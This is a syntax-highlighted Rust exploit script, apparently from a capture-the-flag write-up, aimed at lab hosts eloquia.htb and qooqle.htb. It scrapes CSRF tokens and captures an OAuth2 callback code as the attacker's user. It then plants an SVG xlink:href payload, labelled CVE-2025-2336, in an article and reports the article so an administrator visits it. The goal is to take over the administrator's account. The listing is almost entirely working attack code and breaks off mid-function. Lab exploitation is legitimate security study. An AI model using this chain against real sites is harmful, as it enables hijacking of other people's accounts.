+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> chrono::Local;</span><br><span class="line"><span class="keyword">use</span> colored::*;</span><br><span class="line"><span class="keyword">use</span> regex::Regex;</span><br><span class="line"><span class="keyword">use</span> reqwest::blocking::&#123;Client, multipart&#125;;</span><br><span class="line"><span class="keyword">use</span> reqwest::redirect::Policy;</span><br><span class="line"><span class="keyword">use</span> scraper::&#123;Html, Selector&#125;;</span><br><span class="line"><span class="keyword">use</span> std::time::&#123;Duration, Instant&#125;;</span><br><span class="line"><span class="keyword">use</span> std::thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TARGET: &amp;<span class="type">str</span> = <span class="string">&quot;http://eloquia.htb&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> QOOQLE: &amp;<span class="type">str</span> = <span class="string">&quot;http://qooqle.htb&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> USERNAME: &amp;<span class="type">str</span> = <span class="string">&quot;kujen&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> PASSWORD: &amp;<span class="type">str</span> = <span class="string">&quot;kojjakojja&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> TIMEOUT_SHORT: <span class="type">u64</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> TIMEOUT_LONG: <span class="type">u64</span> = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">create_client</span>(timeout_secs: <span class="type">u64</span>) <span class="punctuation">-&gt;</span> Client &#123;</span><br><span class="line">    Client::<span class="title function_ invoke__">builder</span>()</span><br><span class="line">        .<span class="title function_ invoke__">timeout</span>(Duration::<span class="title function_ invoke__">from_secs</span>(timeout_secs))</span><br><span class="line">        .<span class="title function_ invoke__">cookie_store</span>(<span class="literal">true</span>)</span><br><span class="line">        .<span class="title function_ invoke__">redirect</span>(Policy::<span class="title function_ invoke__">none</span>())</span><br><span class="line">        .<span class="title function_ invoke__">pool_max_idle_per_host</span>(<span class="number">10</span>)</span><br><span class="line">        .<span class="title function_ invoke__">build</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to create client&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">log_info</span>(msg: &amp;<span class="type">str</span>)    &#123; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, <span class="string">&quot;[*]&quot;</span>.<span class="title function_ invoke__">blue</span>().<span class="title function_ invoke__">bold</span>(),   msg); &#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">log_success</span>(msg: &amp;<span class="type">str</span>) &#123; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, <span class="string">&quot;[+]&quot;</span>.<span class="title function_ invoke__">green</span>().<span class="title function_ invoke__">bold</span>(),  msg); &#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">log_error</span>(msg: &amp;<span class="type">str</span>)   &#123; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, <span class="string">&quot;[-]&quot;</span>.<span class="title function_ invoke__">red</span>().<span class="title function_ invoke__">bold</span>(),    msg); &#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">log_warning</span>(msg: &amp;<span class="type">str</span>) &#123; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, <span class="string">&quot;[!]&quot;</span>.<span class="title function_ invoke__">yellow</span>().<span class="title function_ invoke__">bold</span>(), msg); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">extract_csrf</span>(html: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">re</span> = Regex::<span class="title function_ invoke__">new</span>(<span class="string">r#&quot;csrfmiddlewaretoken[&quot;\s]+value=&quot;([^&quot;]+)&quot;&quot;#</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    re.<span class="title function_ invoke__">captures</span>(html).<span class="title function_ invoke__">and_then</span>(|c| c.<span class="title function_ invoke__">get</span>(<span class="number">1</span>)).<span class="title function_ invoke__">map</span>(|m| m.<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">extract_article_id</span>(location: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">String</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">re</span> = Regex::<span class="title function_ invoke__">new</span>(<span class="string">r&quot;/article/visit/(\d+)/&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    re.<span class="title function_ invoke__">captures</span>(location).<span class="title function_ invoke__">and_then</span>(|c| c.<span class="title function_ invoke__">get</span>(<span class="number">1</span>)).<span class="title function_ invoke__">map</span>(|m| m.<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">login_eloquia</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/accounts/login/&quot;</span>, TARGET);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">resp</span> = client.<span class="title function_ invoke__">get</span>(&amp;url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">csrf</span> = <span class="title function_ invoke__">extract_csrf</span>(&amp;resp).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;CSRF token not found&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">params</span> = [(<span class="string">&quot;username&quot;</span>, USERNAME), (<span class="string">&quot;password&quot;</span>, PASSWORD), (<span class="string">&quot;csrfmiddlewaretoken&quot;</span>, &amp;csrf)];</span><br><span class="line">    client.<span class="title function_ invoke__">post</span>(&amp;url).form(&amp;params).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">login_qooqle</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/login/&quot;</span>, QOOQLE);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">resp</span> = client.<span class="title function_ invoke__">get</span>(&amp;url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">csrf</span> = <span class="title function_ invoke__">extract_csrf</span>(&amp;resp).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;CSRF token not found&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">params</span> = [(<span class="string">&quot;username&quot;</span>, USERNAME), (<span class="string">&quot;password&quot;</span>, PASSWORD), (<span class="string">&quot;csrfmiddlewaretoken&quot;</span>, &amp;csrf)];</span><br><span class="line">    client.<span class="title function_ invoke__">post</span>(&amp;url).form(&amp;params).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run the OAuth2 flow as *our* Qooqle user and capture the short-lived code.</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">generate_oauth_url</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>, <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qooqle_client</span> = <span class="title function_ invoke__">create_client</span>(TIMEOUT_SHORT);</span><br><span class="line">    <span class="title function_ invoke__">login_qooqle</span>(&amp;qooqle_client)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">temp_client</span> = <span class="title function_ invoke__">create_client</span>(TIMEOUT_SHORT);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_resp</span> = temp_client</span><br><span class="line">        .<span class="title function_ invoke__">get</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/accounts/oauth2/qooqle/authorize/&quot;</span>, TARGET))</span><br><span class="line">        .<span class="title function_ invoke__">send</span>()?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_url</span> = auth_resp</span><br><span class="line">        .<span class="title function_ invoke__">headers</span>().<span class="title function_ invoke__">get</span>(<span class="string">&quot;Location&quot;</span>).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;No Location header&quot;</span>)?</span><br><span class="line">        .<span class="title function_ invoke__">to_str</span>()?.<span class="title function_ invoke__">to_string</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_info</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Auth URL: &#123;&#125;&quot;</span>, auth_url));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_page</span> = qooqle_client.<span class="title function_ invoke__">get</span>(&amp;auth_url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">csrf</span> = <span class="title function_ invoke__">extract_csrf</span>(&amp;auth_page).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;CSRF token not found&quot;</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Carry over every hidden field the authorize form expects</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">document</span> = Html::<span class="title function_ invoke__">parse_document</span>(&amp;auth_page);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">selector</span> = Selector::<span class="title function_ invoke__">parse</span>(<span class="string">&quot;input[type=hidden]&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">form_data</span> = <span class="built_in">vec!</span>[</span><br><span class="line">        (<span class="string">&quot;csrfmiddlewaretoken&quot;</span>.<span class="title function_ invoke__">to_string</span>(), csrf),</span><br><span class="line">        (<span class="string">&quot;allow&quot;</span>.<span class="title function_ invoke__">to_string</span>(), <span class="string">&quot;Authorize&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">element</span> <span class="keyword">in</span> document.<span class="title function_ invoke__">select</span>(&amp;selector) &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> (<span class="title function_ invoke__">Some</span>(name), <span class="title function_ invoke__">Some</span>(value)) = (element.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">attr</span>(<span class="string">&quot;name&quot;</span>), element.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">attr</span>(<span class="string">&quot;value&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> name != <span class="string">&quot;csrfmiddlewaretoken&quot;</span> &#123;</span><br><span class="line">                form_data.<span class="title function_ invoke__">push</span>((name.<span class="title function_ invoke__">to_string</span>(), value.<span class="title function_ invoke__">to_string</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_response</span> = qooqle_client.<span class="title function_ invoke__">post</span>(&amp;auth_url).form(&amp;form_data).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">callback_url</span> = auth_response</span><br><span class="line">        .<span class="title function_ invoke__">headers</span>().<span class="title function_ invoke__">get</span>(<span class="string">&quot;Location&quot;</span>).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;No callback URL&quot;</span>)?</span><br><span class="line">        .<span class="title function_ invoke__">to_str</span>()?.<span class="title function_ invoke__">to_string</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">log_info</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Callback URL: &#123;&#125;&quot;</span>, callback_url));</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(callback_url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">download_banner</span>(client: &amp;Client) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">u8</span>&gt;, <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/static/assets/images/main-banner/banner-one/main-banner.png&quot;</span>, TARGET);</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(client.<span class="title function_ invoke__">get</span>(&amp;url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">bytes</span>()?.<span class="title function_ invoke__">to_vec</span>())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CVE-2025-2336: xlink:href on an SVG &lt;image&gt; survives ngSanitize.</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">create_article</span>(client: &amp;Client, oauth_url: &amp;<span class="type">str</span>, banner_data: &amp;[<span class="type">u8</span>])</span><br><span class="line">    <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">String</span>, <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/article/create/&quot;</span>, TARGET);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">resp</span> = client.<span class="title function_ invoke__">get</span>(&amp;url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">csrf</span> = <span class="title function_ invoke__">extract_csrf</span>(&amp;resp).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;CSRF token not found&quot;</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">timestamp</span> = Local::<span class="title function_ invoke__">now</span>().format(<span class="string">&quot;%H:%M:%S&quot;</span>).<span class="title function_ invoke__">to_string</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">svg_payload</span> = <span class="built_in">format!</span>(</span><br><span class="line">        <span class="string">r#&quot;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;&lt;image xlink:href=&quot;&#123;&#125;&quot; width=&quot;1&quot; height=&quot;1&quot;/&gt;&lt;/svg&gt;&lt;p&gt;&lt;strong&gt;URGENT&lt;/strong&gt;&lt;/p&gt;&quot;#</span>,</span><br><span class="line">        oauth_url</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">form</span> = multipart::Form::<span class="title function_ invoke__">new</span>()</span><br><span class="line">        .<span class="title function_ invoke__">text</span>(<span class="string">&quot;title&quot;</span>, <span class="built_in">format!</span>(<span class="string">&quot;URGENT [&#123;&#125;]&quot;</span>, timestamp))</span><br><span class="line">        .<span class="title function_ invoke__">text</span>(<span class="string">&quot;content&quot;</span>, svg_payload)</span><br><span class="line">        .<span class="title function_ invoke__">text</span>(<span class="string">&quot;csrfmiddlewaretoken&quot;</span>, csrf)</span><br><span class="line">        .<span class="title function_ invoke__">part</span>(<span class="string">&quot;banner&quot;</span>, multipart::Part::<span class="title function_ invoke__">bytes</span>(banner_data.<span class="title function_ invoke__">to_vec</span>())</span><br><span class="line">            .<span class="title function_ invoke__">file_name</span>(<span class="string">&quot;b.png&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">mime_str</span>(<span class="string">&quot;image/png&quot;</span>)?);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">create_resp</span> = client.<span class="title function_ invoke__">post</span>(&amp;url).<span class="title function_ invoke__">multipart</span>(form).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">location</span> = create_resp.<span class="title function_ invoke__">headers</span>().<span class="title function_ invoke__">get</span>(<span class="string">&quot;Location&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;No Location header&quot;</span>)?.<span class="title function_ invoke__">to_str</span>()?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">extract_article_id</span>(location).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;Could not extract article ID&quot;</span>.<span class="title function_ invoke__">into</span>())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">report_article</span>(client: &amp;Client, article_id: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/article/visit/&#123;&#125;/&quot;</span>, TARGET, article_id);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">resp</span> = client.<span class="title function_ invoke__">get</span>(&amp;url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">csrf</span> = <span class="title function_ invoke__">extract_csrf</span>(&amp;resp).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;CSRF token not found&quot;</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">report_url</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/article/report/&#123;&#125;/&quot;</span>, TARGET, article_id);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">params</span> = [</span><br><span class="line">        (<span class="string">&quot;csrfmiddlewaretoken&quot;</span>, csrf.<span class="title function_ invoke__">as_str</span>()),</span><br><span class="line">        (<span class="string">&quot;article_id&quot;</span>, article_id),</span><br><span class="line">        (<span class="string">&quot;reason&quot;</span>, <span class="string">&quot;Inappropriate content&quot;</span>),</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    client.<span class="title function_ invoke__">post</span>(&amp;report_url)</span><br><span class="line">        .<span class="title function_ invoke__">header</span>(<span class="string">&quot;X-Requested-With&quot;</span>, <span class="string">&quot;XMLHttpRequest&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">header</span>(<span class="string">&quot;Referer&quot;</span>, &amp;url)</span><br><span class="line">        .form(&amp;params)</span><br><span class="line">        .<span class="title function_ invoke__">send</span>()?;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Re-run the OAuth login and see whose account we land in.</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">check_takeover</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(<span class="type">bool</span>, <span class="type">String</span>), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qooqle_client</span> = <span class="title function_ invoke__">create_client</span>(TIMEOUT_SHORT);</span><br><span class="line">    <span class="title function_ invoke__">login_qooqle</span>(&amp;qooqle_client)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">test_client</span> = <span class="title function_ invoke__">create_client</span>(TIMEOUT_SHORT);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_resp</span> = test_client</span><br><span class="line">        .<span class="title function_ invoke__">get</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/accounts/oauth2/qooqle/authorize/&quot;</span>, TARGET)).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_url</span> = auth_resp.<span class="title function_ invoke__">headers</span>().<span class="title function_ invoke__">get</span>(<span class="string">&quot;Location&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;No Location header&quot;</span>)?.<span class="title function_ invoke__">to_str</span>()?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_page</span> = qooqle_client.<span class="title function_ invoke__">get</span>(auth_url).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">csrf</span> = <span class="title function_ invoke__">extract_csrf</span>(&amp;auth_page).<span class="title function_ invoke__">ok_or</span>(<span class="string">&quot;CSRF token not found&quot;</span>)?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">document</span> = Html::<span class="title function_ invoke__">parse_document</span>(&amp;auth_page);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">selector</span> = Selector::<span class="title function_ invoke__">parse</span>(<span class="string">&quot;input[type=hidden]&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">form_data</span> = <span class="built_in">vec!</span>[</span><br><span class="line">        (<span class="string">&quot;csrfmiddlewaretoken&quot;</span>.<span class="title function_ invoke__">to_string</span>(), csrf),</span><br><span class="line">        (<span class="string">&quot;allow&quot;</span>.<span class="title function_ invoke__">to_string</span>(), <span class="string">&quot;Authorize&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">element</span> <span class="keyword">in</span> document.<span class="title function_ invoke__">select</span>(&amp;selector) &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> (<span class="title function_ invoke__">Some</span>(name), <span class="title function_ invoke__">Some</span>(value)) = (element.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">attr</span>(<span class="string">&quot;name&quot;</span>), element.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">attr</span>(<span class="string">&quot;value&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> name != <span class="string">&quot;csrfmiddlewaretoken&quot;</span> &#123;</span><br><span class="line">                form_data.<span class="title function_ invoke__">push</span>((name.<span class="title function_ invoke__">to_string</span>(), value.<span class="title function_ 